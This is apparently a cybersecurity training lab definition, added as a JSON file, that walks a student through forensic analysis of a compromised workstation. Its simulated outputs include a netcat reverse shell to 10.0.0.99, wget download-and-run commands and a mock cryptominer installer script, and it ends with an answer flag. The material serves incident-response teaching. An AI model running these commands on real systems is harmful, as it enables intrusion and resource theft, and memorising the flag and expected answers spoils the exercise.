@@ -1,0 +1,50 @@
+{
+  "id": "lab_forensics_basics",
+  "title": "Digital Forensics Basics",
+  "description": "Learn fundamental digital forensics techniques for investigating security incidents.",
+  "difficulty": "Intermediate",
+  "duration": "35 min",
+  "category": "Incident Response",
+  "semester_level": 2,
+  "scenario": "A workstation is suspected of being compromised. Perform forensic analysis to find evidence of malicious activity.",
+  "environment": "terminal",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Check Running Processes",
+      "instruction": "List all running processes to identify suspicious activity.",
+      "hint": "Use ps with aux flags",
+      "expected_command": "ps aux",
+      "output": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1   2384  1532 ?        Ss   09:00   0:01 /sbin/init\nroot       456  0.0  0.2   5432  2456 ?        Ss   09:01   0:00 /usr/sbin/sshd\nwww-data  1234 15.2  5.6  45678 12345 ?        S    10:30   5:23 /tmp/.hidden/cryptominer\nroot      2345  0.0  0.1   3456  1234 ?        S    09:02   0:00 /usr/sbin/cron\nnobody    3456  0.5  1.2  12345  6789 ?        S    11:00   0:45 nc -e /bin/bash 10.0.0.99 4444",
+      "explanation": "Found suspicious processes: a cryptominer in /tmp and a reverse shell connection!"
+    },
+    {
+      "step": 2,
+      "title": "Check Network Connections",
+      "instruction": "Examine active network connections for suspicious outbound connections.",
+      "hint": "Use netstat or ss command",
+      "expected_command": "netstat -tulpn",
+      "output": "Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      456/sshd\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      789/apache2\ntcp        0      0 192.168.1.100:45678     10.0.0.99:4444          ESTABLISHED 3456/nc\ntcp        0      0 192.168.1.100:54321     mining-pool.com:3333    ESTABLISHED 1234/cryptominer",
+      "explanation": "Confirmed: active C2 connection to 10.0.0.99 and connection to a mining pool!"
+    },
+    {
+      "step": 3,
+      "title": "Examine Bash History",
+      "instruction": "Check the bash history for commands executed by the attacker.",
+      "hint": "Read the .bash_history file",
+      "expected_command": "cat /home/user/.bash_history",
+      "output": "wget http://10.0.0.99/malware.sh\nchmod +x malware.sh\n./malware.sh\nmkdir /tmp/.hidden\ncd /tmp/.hidden\nwget http://mining-pool.com/miner -O cryptominer\nchmod +x cryptominer\n./cryptominer -o mining-pool.com:3333 -u attacker_wallet\nnc -e /bin/bash 10.0.0.99 4444 &",
+      "explanation": "Found the attack chain: downloaded malware, installed cryptominer, established reverse shell."
+    },
+    {
+      "step": 4,
+      "title": "Extract IOCs",
+      "instruction": "Extract and document the Indicators of Compromise (IOCs) from the malware.",
+      "hint": "Check the malware script contents",
+      "expected_command": "cat /home/user/malware.sh",
+      "output": "#!/bin/bash\n# Cryptominer installer\n\nC2_SERVER=\"10.0.0.99\"\nMINING_POOL=\"mining-pool.com:3333\"\nWALLET=\"4ABC123def456...\"\n\nmkdir -p /tmp/.hidden\ncd /tmp/.hidden\nwget http://$C2_SERVER/cryptominer -q\nchmod +x cryptominer\n./cryptominer -o $MINING_POOL -u $WALLET &\nnc -e /bin/bash $C2_SERVER 4444 &\n\nFLAG{ISC_FORENSICS_INVESTIGATOR_2024}",
+      "explanation": "Documented all IOCs: C2 server, mining pool, wallet address. Ready for incident report.",
+      "flag": "FLAG{ISC_FORENSICS_INVESTIGATOR_2024}"
+    }
+  ]
+}
